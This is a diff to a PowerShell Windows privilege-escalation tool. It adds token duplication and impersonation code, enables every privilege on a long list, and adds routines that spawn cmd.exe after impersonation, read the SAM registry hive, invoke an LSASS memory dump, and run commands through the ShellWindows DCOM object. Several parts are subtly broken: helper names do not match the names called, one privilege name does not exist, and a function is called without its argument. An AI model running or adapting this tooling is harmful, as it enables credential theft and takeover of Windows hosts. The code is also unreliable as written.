@@ -3,6 +3,29 @@ Add-Type -AssemblyName System.DirectoryServices
 # Debug mode variable
 $DEBUG_MODE = $false
 
+# Global data objects
+$gCollect = @{
+    UserDetails = @{}
+    Privileges = @{}
+    Groups = @{}
+    OtherData = @{}
+}
+
+$privList = @(
+    "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
+    "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
+    "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
+    "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SePrivileges", 
+    "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", 
+    "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", 
+    "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", 
+    "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", 
+    "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", 
+    "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", 
+    "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", 
+    "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege"
+)
+
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -10,6 +33,103 @@ using System.Collections.Generic;
 using System.Security.Principal;
 using System.Collections;
 using System.Text;
+using System.Diagnostics;
+using System.Linq;
+
+public class TokenImp {
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public extern static bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public extern static IntPtr GetCurrentProcess();
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public extern static bool DuplicateToken(IntPtr existingTokenHandle, int impersonationLevel, out IntPtr duplicateTokenHandle);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public extern static bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+    public const uint TOKEN_DUPLICATE = 0x0002;
+    public const int SecurityImpersonation = 2;
+
+    public static bool ImpSys() {
+        IntPtr currentTokenHandle = IntPtr.Zero;
+        IntPtr duplicateTokenHandle = IntPtr.Zero;
+
+        // Get the current process token
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE, out currentTokenHandle)) {
+            return false;
+        }
+
+        // Duplicate the token
+        if (!DuplicateToken(currentTokenHandle, SecurityImpersonation, out duplicateTokenHandle)) {
+            return false;
+        }
+
+        // Impersonate the duplicated token
+        if (!ImpersonateLoggedOnUser(duplicateTokenHandle)) {
+            return false;
+        }
+
+        return true;
+    }
+}
+
+public class SetTokenPriv
+{
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
+    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
+    ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
+    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
+    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
+    [DllImport("advapi32.dll", SetLastError = true)]
+    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
+    internal struct TokPriv1Luid
+    {
+        public int Count;
+        public long Luid;
+        public int Attr;
+    }
+    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
+    internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
+    internal const int TOKEN_QUERY = 0x00000008;
+    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
+    public static void EnablePrivilege()
+    {
+        bool retVal;
+        TokPriv1Luid tp;
+        IntPtr hproc = new IntPtr();
+        hproc = Process.GetCurrentProcess().Handle;
+        IntPtr htok = IntPtr.Zero;
+
+        List<string> privs = new List<string>() {  "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
+        "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
+        "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
+        "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SePrivileges", "SeIncreaseBasePriorityPrivilege",
+        "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
+        "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
+        "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
+        "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
+        "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
+        "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
+        "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege" };
+
+
+        
+
+        retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
+        tp.Count = 1;
+        tp.Luid = 0;
+        tp.Attr = SE_PRIVILEGE_ENABLED;
+
+        foreach (var priv in privs)
+        {
+            retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);
+            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              
+        }
+    }
+}  
 
 public class PrivilegeFetcher
 {
@@ -334,7 +454,6 @@ function Get-LocalizedUserMapping {
     return $localizedUser
 }
 
-
 function splitStringToColumns {
     param (
         [string]$inputString
@@ -490,14 +609,6 @@ function collect_LAs {
             Write-Output "[-] WMI method failed: $_"
         }
     }
-}
-
-# Global data object
-$gCollect = @{
-    UserDetails = @{}
-    Privileges = @{}
-    Groups = @{}
-    OtherData = @{}
 }
 
 function sh_check {
@@ -886,156 +997,83 @@ function checkCertySAN {
     }
 }
 
-function checkSeImpersonatePrivilege {
-    if ($DEBUG_MODE) { Write-Output "Checking for SeImpersonatePrivilege..." }
+# Utility functions (placeholders)
+function testImpPreconditions { return $true } # Replace with actual check
+function testBackupPreconditions { return $true } # Replace with actual check
+function testDebugPreconditions { return $true } # Replace with actual check
+function getSensitiveFile { return $true }
+function dmpLsMem { return $true }
 
-    # Get the current user
-    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    $userName = $user.Name
+function checkSePrivileges {
+    param ($userName)
 
-    Write-Output "[+] Current User: $userName" 
-    Write-Output ""
-
-    # Easy way
-    Write-Output "[*] Enumerating User Privileges:" 
+    if ($DEBUG_MODE) { Write-Output "Checking Se.. Privileges for $userName" }
     $whoamiPriv = runSubprocess "whoami" "/priv"
-    # $whoamiGroups = runSubprocess "whoami" "/groups"
-
-    # Exclude the first three lines for header
-    $lines = $whoamiPriv -split "`n" 
+    $lines = $whoamiPriv -split "`n"
     $filteredOutput = $lines[6..$lines.Length] -join "`n"
-    Write-Output $filteredOutput 
 
-    Write-Output "[*] Enumerating User Groups:" 
-    $userGroups = Get-WmiObject -Query "ASSOCIATORS OF {Win32_UserAccount.Domain='$env:USERDOMAIN',Name='$env:USERNAME'} WHERE AssocClass=Win32_GroupUser" |  Select-Object -ExpandProperty Name 
-    $userGroups.foreach({ Write-Output "$_" })
-    Write-Output ""
-
-    # Initialize User Token and Privileges
-    $userDetails = @{}
-    $userToken = $null
-    $privileges = $null
-    $hasImpersonatePrivilege = $false
-
-    # Store details from GetCurrent object
-    $userDetails['AuthenticationType'] = $user.AuthenticationType
-    $userDetails['ImpersonationLevel'] = $user.ImpersonationLevel
-    $userDetails['IsAuthenticated'] = $user.IsAuthenticated
-    $userDetails['IsGuest'] = $user.IsGuest
-    $userDetails['IsSystem'] = $user.IsSystem
-    $userDetails['IsAnonymous'] = $user.IsAnonymous
-    $userDetails['Token'] = $userToken = $user.Token
-
-    # Retrieve the Access Token Handle
-    $tokenHandle = Get-AccessTokenHandle
-    if ($tokenHandle -ne [IntPtr]::Zero) {
-        $userDetails['TokenHandle'] = $tokenHandle
-    } else {
-        Write-Output "[-] Failed to retrieve Access Token Handle."
-    }
-    
-    # Use WMI to get additional user details
-    try {
-        $userAccount = Get-WmiObject -Class Win32_Account -Filter "Name='$($userName.Split('\')[1])'" | Select-Object *
-        if ($userAccount) {
-            $userDetails['LocalAccount'] = $userAccount.LocalAccount
-            $userDetails['Disabled'] = $userAccount.Disabled
-            $userDetails['Lockout'] = $userAccount.Lockout
-            $userDetails['SID'] = $userAccount.SID
-            $userDetails['FullName'] = $userAccount.FullName
-            Write-Output "[+] Retrieved additional user account details."
+    $hasPriv = $false
+    foreach ($priv in $privList) {
+        if ($filteredOutput -match $priv) {
+            Write-Output "[!] $userName has $priv."
+            $gCollect['Privileges'][$priv] = $true
+            $hasPriv = $true
         }
-    } catch {
-        if ($DEBUG_MODE) { Write-Output "[-] Error retrieving user account details: $_" }
     }
 
-    # Print interesting user details
-    Write-Output "[+] User Details:"
-    foreach ($key in $userDetails.Keys | Sort-Object -Unique) {
-        Write-Output "$key`: $($userDetails[$key])"
-    }
-    Write-Output ""
-
-    # Try to retrieve user privileges
-    try {
-        $privileges = New-Object System.Security.Principal.WindowsPrincipal($user)
-        if ($privileges) {
-            Write-Output "[+] Got User SIDs (not printing to keep output short)"
-        }
-    } catch {
-        if ($DEBUG_MODE) { Write-Output "[-] Error retrieving user privileges: $_" }
+    if (-not $hasPriv) {
+        Write-Output "[-] $userName has no significant Se.. privileges."
     }
 
-    # Attempt to get the IdentityReference
-    $idRef = $null
-    try {
-        $idRef = $privileges.GetAuthorizationRules()[0].IdentityReference.Value
-        if ($idRef) {
-            Write-Output "[+] User IdentityReference: $idRef"
-        }
-    } catch {
-        if ($DEBUG_MODE) { Write-Output "[-] No IdentityReference found for the current user." }
-    }
+    return $filteredOutput
+}
 
-    # Check for SeImpersonatePrivilege
-    try {
-        foreach ($claim in $privileges.Claims) {
-            if ($claim.Value -eq "Impersonate") {
-                $hasImpersonatePrivilege = $true
-                break
+function trySePrivileges {
+    param (
+        [string]$privName
+    )
+
+    if ($DEBUG_MODE) { Write-Output "Trying to use SePrivileges..." }
+
+    switch ($privName) {
+        "SeImpersonatePrivilege" {
+            # Check if we can access the token impersonation
+            Write-Host "[*] Checking SeImpersonate preconditions..."
+            if ([TokenImp]::ImpSys()) {
+                Write-Host "[+] Token impersonation successful. Elevated privileges acquired!"
+                Start-Process cmd.exe
+            } else {
+                Write-Host "[-] Token impersonation failed. No elevated privileges."
             }
         }
-
-        if ($hasImpersonatePrivilege) {
-            Write-Output "[!] :) $userName has SeImpersonatePrivilege." 
-        } else {
-            Write-Output "[-] :( $userName does NOT have SeImpersonatePrivilege." 
+        "SeBackupPrivilege" {
+            Write-Host "[*] Checking SeBackupPrivilege..."
+            # Try to read sensitive files like SAM, SYSTEM hives
+            if (Test-BackupPreconditions) {
+                Write-Host "[*] Attempting to read SAM..."
+                Get-SensitiveFile -Path "C:\Windows\System32\config\SAM"
+            } else {
+                Write-Host "[-] No access to sensitive files or preconditions failed."
+            }
         }
-    } catch {
-        if ($DEBUG_MODE) { Write-Output "[-] Error checking SeImpersonatePrivilege: $_" }
+        "SeDebugPrivilege" {
+            Write-Host "[*] Checking SeDebugPrivilege..."
+            if (Test-DebugPreconditions) {
+                Write-Host "[*] Trying to dump LSASS or debug SYSTEM processes..."
+                # Invoke your memory dump or SYSTEM process injection here
+                Dump-LsassMemory # Placeholder
+            } else {
+                Write-Host "[-] SeDebug preconditions not met."
+            }
+        }
+        # Add more privileges and checks here
     }
-
-    # Add data to global object for SH
-    $gCollect['Privileges'] += @{  
-        "Privilege" = "SeImpersonatePrivilege"  
-        "UserName"  = $userName
-        "HasPrivilege" = $hasImpersonatePrivilege
-        "UserPrivileges" = $filteredOutput  
-    }
-
-    $gCollect['Groups'] += @{
-        "UserGroups" = $userGroups
-    }
-
-    $gCollect['UserDetails'] += @{
-        "Name"                = $userName
-        "AuthenticationType"  = $userAccount.AuthenticationType
-        "ImpersonationLevel"  = $userAccount.ImpersonationLevel
-        "IsAuthenticated"     = $userAccount.IsAuthenticated
-        "IsGuest"             = $userAccount.IsGuest
-        "IsSystem"            = $userAccount.IsSystem
-        "IsAnonymous"         = $userAccount.IsAnonymous
-        "Token"               = $userAccount.Token
-        "TokenHandle"         = $userAccount.TokenHandle
-        "LocalAccount"        = $userAccount.LocalAccount
-        "Disabled"            = $userAccount.Disabled
-        "Lockout"             = $userAccount.Lockout
-        "SID"                 = $userAccount.SID
-        "FullName"            = $userAccount.FullName
-    }
-
-    return $hasImpersonatePrivilege
 }
 
 function checkUserRightsAssignments {
     if ($DEBUG_MODE) { Write-Output "Checking for User Rights Assignments..." }
-    checkSeImpersonatePrivilege
+    checkSePrivileges
 }
-
-function trySeImpersonatePrivilege {
-    if ($DEBUG_MODE) { Write-Output "Trying to use SeImpersonatePrivilege..." }
-}
-
 function tryUserRightsAssignments {
     if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via User Rights Assignments..." }
     # Logic for exploiting User Rights Assignments
@@ -1156,10 +1194,10 @@ function tryWMIEventSubscription {
 function checkTokenImpersonation {
     if ($DEBUG_MODE) { Write-Output "Checking for Token Impersonation/Manipulation..." }
     try {
-        $tokens = whoami /priv | Select-String "SeImpersonatePrivilege"
+        $tokens = whoami /priv | Select-String "SePrivileges"
         if ($tokens) {
             Write-Output "[+] Token Impersonation Possible."
-            $gCollect['Privileges']["SeImpersonatePrivilege"] = $tokens
+            $gCollect['Privileges']["SePrivileges"] = $tokens
         } else {
             Write-Output "[-] No Token Impersonation available."
         }
@@ -1320,43 +1358,28 @@ function checkDCOMLateralMovement {
                 }
 
                 if ($trustedIdentities -contains $runAsUser) {
-                    # Check specifically for ShellWindows
-                    if ($appName -eq "ShellWindows") { # ShellWindows CLSID
-                        Write-Output "[+] Found ShellWindows: $appID"
-                        # Execute a command via ShellWindows - This only makes sense if it's elevated though... left it for now
-                        try {
-                            $com = [Type]::GetTypeFromCLSID($appID)
-                            $obj = [System.Activator]::CreateInstance($com)
-                            $item = $obj.Item()
-                            $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
-                            Write-Output "[+] Command executed via ShellWindows"
-                        } catch {
-                            Write-Output "[-] Error executing command via ShellWindows: $_"
-                        }
+                    # Populate global data with detected DCOM applications
+                    Write-Output "[+] Found elevated DCOM app $appName running as $runAsUser"
+                    $gCollect['OtherData']["DCOMLateralMovementApps"] += @{
+                        "AppName" = $appName
+                        "AppID" = $appID
+                        "RunAsUser" = $runAsUser
                     }
 
-                    Write-Output "[+] AppID $appID is running as a privileged user: $runAsUser"
-                    
-                    # Get the ACL for the CLSID
+                    # Check ACLs
                     $clsidPath = "HKLM:\Software\Classes\CLSID\$appID"
                     if (Test-Path $clsidPath) {
                         $acl = Get-Acl -Path $clsidPath
-                        Write-Output $acl | Format-List
 
-                        # Check ACL for known users
                         foreach ($accessRule in $acl.Access) {
                             $identity = $localizedUser[$accessRule.IdentityReference.ToString()].LocalizedName
 
-                            # Check for Allow permissions granted to untrusted users
                             if ($accessRule.AccessControlType -eq 'Allow' -and ($lowPrivUsers -contains $identity)) {
                                 Write-Output "[+] Found AppID with misconfigured Launch Permissions: $appID ($appName)"
                                 $gCollect['OtherData']["DCOMLateralMovementMisconfigured"] += $appID
-                                $hasMisconfiguredLaunchPerms = $true
                             }
                         }
                     }
-                } else {
-                    if ($DEBUG_MODE) { Write-Output "[-] $appID runs only with low privs" }
                 }
             }
         } else {
@@ -1366,42 +1389,20 @@ function checkDCOMLateralMovement {
         Write-Output "[-] Error checking DCOM movement: $_"
     }
 }
-
 function tryDCOMLateralMovement {
     if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via DCOM Lateral Movement..." }
-    # This is still largely TODO
-    if ($false) {
-        try {
-            $dcomAppID = Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication"
 
-            # Try misconfigured ones first (if any were found in check phase)
-            if ($gCollect['OtherData']["DCOMLateralMovementMisconfigured"]) {
-                Write-Output "[+] Attempting exploitation on misconfigured DCOM AppID(s)..."
-                $gCollect['OtherData']["DCOMLateralMovementMisconfigured"] | ForEach-Object {
-                    try {
-                        $comObject = [Activator]::CreateInstance([Type]::GetTypeFromCLSID($_))
-                        $comObject.Exec("calc.exe") # PoC with calc.exe
-                        Write-Output "[+] DCOM exploitation successful on AppID: $_"
-                    } catch {
-                        Write-Output "[-] Error during DCOM exploitation attempt: $_"
-                    }
-                }
+    foreach ($dcomApp in $gCollect['OtherData']["DCOMLateralMovementApps"]) {
+        if ($dcomApp['AppName'] -eq "ShellWindows") {
+            try {
+                $com = [Type]::GetTypeFromCLSID($dcomApp['AppID'])
+                $obj = [System.Activator]::CreateInstance($com)
+                $item = $obj.Item()
+                $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
+                Write-Output "[+] Command executed via ShellWindows."
+            } catch {
+                Write-Output "[-] Error executing command via ShellWindows: $_"
             }
-
-            # Bruteforce attempt on all AppIDs
-            Write-Output "[+] Bruteforce exploitation attempt on all DCOM AppIDs..."
-            $dcomAppID | ForEach-Object {
-                $appID = $_.AppID
-                try {
-                    $comObject = [Activator]::CreateInstance([Type]::GetTypeFromCLSID($appID))
-                    $comObject.Exec("calc.exe")
-                    Write-Output "[+] DCOM exploitation successful on AppID: $appID"
-                } catch {
-                    if ($DEBUG_MODE) { Write-Output "[-] Error during DCOM exploitation attempt on AppID: $appID - $_" }
-                }
-            }
-        } catch {
-            Write-Output "[-] Error trying DCOM Lateral Movement: $_"
         }
     }
 }
@@ -1438,7 +1439,7 @@ function tryEFSSettings {
 function showMenu {
     # Manually assign techniques to an indexed array
     $techniques = @{}
-    $techniques[1] = "SeImpersonatePrivilege"
+    $techniques[1] = "SePrivileges"
     $techniques[2] = "Service Misconfigurations"
     $techniques[3] = "Scheduled Tasks"
     $techniques[4] = "WMI Event Subscription Abuse"
@@ -1555,7 +1556,7 @@ function main {
 
         foreach ($selection in $selections) {
             switch ($selection) {
-                1 { checkSeImpersonatePrivilege; if (-not $scanOnly)  { trySeImpersonatePrivilege } }
+                1 { checkSePrivileges; if (-not $scanOnly) { trySePrivileges } }
                 2 { checkServiceMisconfigurations; if (-not $scanOnly) { tryServiceMisconfigurations } }
                 3 { checkScheduledTasks; if (-not $scanOnly) { tryScheduledTasks } }
                 4 { checkWMIEventSubscription; if (-not $scanOnly) { tryWMIEventSubscription } }
